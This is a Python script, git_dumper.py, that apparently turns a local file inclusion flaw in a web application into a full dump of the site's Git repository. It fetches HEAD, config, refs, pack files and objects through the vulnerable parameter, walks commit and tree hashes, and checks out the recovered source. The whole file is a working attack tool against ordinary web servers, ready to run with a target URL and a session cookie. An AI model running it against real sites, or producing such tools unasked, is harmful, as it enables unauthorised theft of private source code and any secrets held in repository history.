#!/usr/bin/env python3
"""
git_dumper.py — General-purpose Git repository dumper for LFI vulnerabilities.
Uses template for content extraction, auto-detects base64 vs text for decoding.
"""

import argparse
import base64
import html
import os
import re
import subprocess
import sys
import zlib

import requests

SHA_RE = re.compile(r'\b[0-9a-f]{40}\b')


class GitDumper:
    def __init__(self, url, output_dir, cookie=None, template=None, timeout=15, verbose=True):
        self.url = url
        self.output_dir = os.path.abspath(output_dir)
        self.git_dir = os.path.join(self.output_dir, '.git')
        os.makedirs(self.git_dir, exist_ok=True)

        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (git-dumper)'
        if cookie:
            self.session.headers['Cookie'] = cookie

        self.template = template
        self.timeout = timeout
        self.verbose = verbose
        self.seen_paths = set()
        self.seen_objects = set()
        self.stats = {'files': 0, 'objects': 0, 'missing': 0, 'corrupted': 0}
        
        self._parse_url()
        self._load_template()

    def _parse_url(self):
        """Extract endpoint and file parameter from the full URL."""
        if '.git' not in self.url:
            print("[!] URL must contain .git")
            sys.exit(1)
        
        if '?' in self.url:
            self.endpoint, query = self.url.split('?', 1)
            self.params = {}
            for pair in query.split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    self.params[k] = v
        else:
            self.endpoint = self.url
            self.params = {}
        
        self.file_param = None
        self.path_prefix = ''
        
        for k, v in self.params.items():
            if '.git' in v:
                self.file_param = k
                if v.startswith('.git'):
                    self.path_prefix = ''
                else:
                    self.path_prefix = v.split('.git')[0]
                break
        
        if not self.file_param:
            if '.git' in self.endpoint:
                self.file_param = None
                self.path_prefix = self.endpoint.split('.git')[0] + '.git/'
            else:
                print("[!] Could not identify .git in URL")
                sys.exit(1)

    def _load_template(self):
        """Load and parse the template file."""
        if not self.template or not os.path.exists(self.template):
            print("[!] Template file required. Use -t <template.html>")
            print("    Template should contain LFI_OUT where file content appears.")
            sys.exit(1)
        
        with open(self.template, 'r') as f:
            template = f.read()
        
        if 'LFI_OUT' not in template:
            print("[!] Template must contain LFI_OUT placeholder")
            sys.exit(1)
        
        before, after = template.split('LFI_OUT', 1)
        
        # Use immediate surroundings for flexible matching
        self.before_anchor = before[-200:] if len(before) > 200 else before
        self.after_anchor = after[:200] if len(after) > 200 else after
        
        self.before_re = re.escape(self.before_anchor)
        self.after_re = re.escape(self.after_anchor)

    def log(self, msg):
        if self.verbose:
            print(msg)

    def extract_content(self, page_text, relpath):
        """Extract content using template, then decode based on server indication."""
        pattern = re.compile(f'{self.before_re}(.*?){self.after_re}', re.DOTALL)
        m = pattern.search(page_text)
        
        if not m:
            self.log(f"[!] Template didn't match for {relpath}")
            return None
        
        raw = m.group(1)
        raw = raw.strip()
        
        # Remove leading/trailing newlines
        if raw.startswith('\n'):
            raw = raw[1:]
        if raw.endswith('\n'):
            raw = raw[:-1]
        
        # Check if server indicated binary/base64 content
        if 'Binary file detected' in page_text or 'base64' in page_text.lower():
            try:
                decoded = base64.b64decode(raw)
                self.log(f"[+] {relpath}: base64 decoded ({len(decoded)} bytes)")
                return decoded
            except Exception as e:
                self.log(f"[!] {relpath}: base64 decode failed: {e}")
                return None
        
        # Treat as text
        try:
            return raw.encode('latin-1')
        except:
            return raw.encode('utf-8', errors='ignore')

    def fetch(self, relpath):
        """Fetch a file from the .git directory via LFI."""
        if self.file_param:
            params = self.params.copy()
            params[self.file_param] = f"{self.path_prefix}.git/{relpath}"
        else:
            params = None
        
        try:
            if params:
                r = self.session.get(self.endpoint, params=params, timeout=self.timeout)
            else:
                url = f"{self.path_prefix}{relpath}"
                r = self.session.get(url, timeout=self.timeout)
        except requests.RequestException as e:
            self.log(f"[!] request error for {relpath}: {e}")
            return None
        
        if r.status_code != 200 or not r.text:
            return None
        
        return self.extract_content(r.text, relpath)

    def save(self, relpath, data):
        """Save fetched data to the output directory."""
        full = os.path.join(self.git_dir, relpath)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, 'wb') as f:
            f.write(data)

    def fetch_and_save(self, relpath, quiet_missing=False):
        """Fetch and save a file, avoiding duplicates."""
        if relpath in self.seen_paths:
            full = os.path.join(self.git_dir, relpath)
            return open(full, 'rb').read() if os.path.exists(full) else None
        
        self.seen_paths.add(relpath)
        data = self.fetch(relpath)
        
        if data is None:
            if not quiet_missing:
                self.log(f"[-] not found: {relpath}")
            return None
        
        self.save(relpath, data)
        self.stats['files'] += 1
        self.log(f"[+] fetched {relpath} ({len(data)} bytes)")
        return data

    def object_relpath(self, sha):
        """Convert SHA to object file path."""
        return f"objects/{sha[:2]}/{sha[2:]}"

    def fetch_object(self, sha):
        """Fetch a git object by SHA."""
        if sha in self.seen_objects:
            return
        
        self.seen_objects.add(sha)
        data = self.fetch_and_save(self.object_relpath(sha), quiet_missing=True)
        
        if data is None:
            self.stats['missing'] += 1
            return
        
        # Verify it's valid zlib data
        try:
            zlib.decompress(data)
        except zlib.error as e:
            self.stats['corrupted'] += 1
            self.log(f"[!] CORRUPT object {sha}: {e}")
            return
        
        self.stats['objects'] += 1
        self.log(f"[+] Valid object: {sha}")
        self.parse_object(sha, data)

    def parse_object(self, sha, raw):
        """Parse a git object and find referenced objects."""
        try:
            content = zlib.decompress(raw)
        except zlib.error:
            return
        
        header, _, body = content.partition(b'\x00')
        try:
            otype = header.split(b' ')[0].decode()
        except Exception:
            return
        
        if otype == 'commit':
            self.parse_commit(body)
        elif otype == 'tree':
            self.parse_tree(body)

    def parse_commit(self, body):
        """Parse commit object to find tree and parent SHAs."""
        text = body.decode(errors='replace')
        for line in text.splitlines():
            if line.startswith('tree '):
                self.fetch_object(line.split()[1])
            elif line.startswith('parent '):
                self.fetch_object(line.split()[1])

    def parse_tree(self, body):
        """Parse tree object to find blob and subtree SHAs."""
        i = 0
        n = len(body)
        while i < n:
            try:
                sp = body.index(b' ', i)
                nul = body.index(b'\x00', sp)
                sha_bytes = body[nul + 1: nul + 21]
                if len(sha_bytes) != 20:
                    break
                sha = sha_bytes.hex()
                self.fetch_object(sha)
                i = nul + 21
            except ValueError:
                break

    def discover_metadata(self):
        """Download all metadata files from .git directory."""
        for path in [
            'HEAD', 'config', 'description', 'packed-refs',
            'index', 'info/exclude', 'logs/HEAD',
            'refs/heads/master', 'refs/heads/main',
            'objects/info/packs',
        ]:
            self.fetch_and_save(path, quiet_missing=True)

    def collect_seed_shas(self):
        """Collect SHA hashes from metadata files."""
        shas = set()
        
        # From HEAD
        head_path = os.path.join(self.git_dir, 'HEAD')
        if os.path.exists(head_path):
            with open(head_path, 'r', errors='replace') as f:
                head = f.read().strip()
            
            m = re.match(r'ref:\s*(\S+)', head)
            if m:
                ref = m.group(1)
                data = self.fetch_and_save(ref, quiet_missing=True)
                if data:
                    shas.update(SHA_RE.findall(data.decode(errors='replace')))
            else:
                shas.update(SHA_RE.findall(head))
        
        # From packed-refs and logs
        for name in ('packed-refs', 'logs/HEAD'):
            p = os.path.join(self.git_dir, name)
            if os.path.exists(p):
                with open(p, 'r', errors='replace') as f:
                    shas.update(SHA_RE.findall(f.read()))
        
        return shas

    def fetch_packs(self):
        """Download pack files if they exist."""
        packs_file = os.path.join(self.git_dir, 'objects/info/packs')
        if not os.path.exists(packs_file):
            return
        
        with open(packs_file, 'r', errors='replace') as f:
            for line in f:
                m = re.search(r'(pack-[0-9a-f]{40})\.pack', line)
                if not m:
                    continue
                name = m.group(1)
                self.fetch_and_save(f'objects/pack/{name}.pack', quiet_missing=True)
                self.fetch_and_save(f'objects/pack/{name}.idx', quiet_missing=True)
                self.log(f"[+] downloaded pack {name}")

    def run(self):
        """Main execution flow."""
        self.log(f"[*] Target: {self.endpoint}")
        if self.file_param:
            self.log(f"[*] File parameter: {self.file_param}")
        
        self.discover_metadata()
        self.fetch_packs()
        
        seeds = self.collect_seed_shas()
        self.log(f"[*] Seed SHAs found: {len(seeds)}")
        
        for sha in seeds:
            self.fetch_object(sha)
        
        self.log(
            f"[*] Done. files={self.stats['files']} "
            f"objects={self.stats['objects']} missing={self.stats['missing']} "
            f"corrupted={self.stats['corrupted']}"
        )
        
        self.checkout()

    def checkout(self):
        """Try to check out the working tree from downloaded objects."""
        # Remove corrupt index file
        index_path = os.path.join(self.git_dir, 'index')
        if os.path.exists(index_path):
            os.remove(index_path)
            self.log("[*] Removed corrupt index file")
        
        if not os.path.isdir(os.path.join(self.git_dir, 'objects')):
            self.log("[!] No objects directory populated; nothing to check out.")
            return
        
        try:
            # Show git history
            r = subprocess.run(
                ['git', 'log', '--all', '--oneline'],
                cwd=self.output_dir, capture_output=True, text=True
            )
            if r.returncode == 0:
                self.log("[+] Git history:")
                self.log(r.stdout)
            else:
                self.log("[!] git log failed:")
                self.log(r.stderr.strip())
            
            # Determine HEAD
            head_path = os.path.join(self.git_dir, 'HEAD')
            if not os.path.exists(head_path):
                self.log("[!] HEAD file not found")
                return
            
            with open(head_path, 'r') as f:
                head_content = f.read().strip()
            
            self.log(f"[*] HEAD: {head_content}")
            
            # Extract commit hash
            if head_content.startswith('ref:'):
                ref = head_content.split(': ')[1]
                ref_path = os.path.join(self.git_dir, ref)
                
                if not os.path.exists(ref_path):
                    self.log(f"[!] Ref file not found: {ref_path}")
                    return
                
                with open(ref_path, 'r') as f:
                    commit_hash = f.read().strip()
            else:
                commit_hash = head_content
            
            self.log(f"[*] Current commit: {commit_hash}")
            
            # Checkout the commit
            r2 = subprocess.run(
                ['git', 'checkout', commit_hash, '.'],
                cwd=self.output_dir, capture_output=True, text=True
            )
            
            if r2.returncode == 0:
                self.log("[+] Working tree checked out successfully.")
                r3 = subprocess.run(
                    ['ls', '-la'],
                    cwd=self.output_dir, capture_output=True, text=True
                )
                if r3.returncode == 0:
                    self.log("[+] Files:")
                    self.log(r3.stdout)
            else:
                self.log("[!] git checkout failed:")
                self.log(r2.stderr.strip())
                self.log("    Try manually: cd <output_dir> && git checkout <commit_hash> .")
        
        except FileNotFoundError:
            self.log("[!] Local `git` binary not found — objects were saved but not checked out.")


def main():
    parser = argparse.ArgumentParser(
        description="Git dumper for LFI vulnerabilities. Uses template for extraction."
    )
    parser.add_argument('url', help="Full URL to .git/HEAD, e.g. 'http://target.com/vuln.php?file=.git/HEAD'")
    parser.add_argument('-o', '--output', default='dumped_repo', help="Output directory")
    parser.add_argument('-c', '--cookie', help='Cookie header, e.g. "session=abc123"')
    parser.add_argument('-t', '--template', required=True, help='HTML template file with LFI_OUT placeholder')
    parser.add_argument('-q', '--quiet', action='store_true', help="Less verbose output")
    args = parser.parse_args()

    dumper = GitDumper(
        args.url,
        args.output,
        cookie=args.cookie,
        template=args.template,
        verbose=not args.quiet
    )
    dumper.run()


if __name__ == '__main__':
    main()
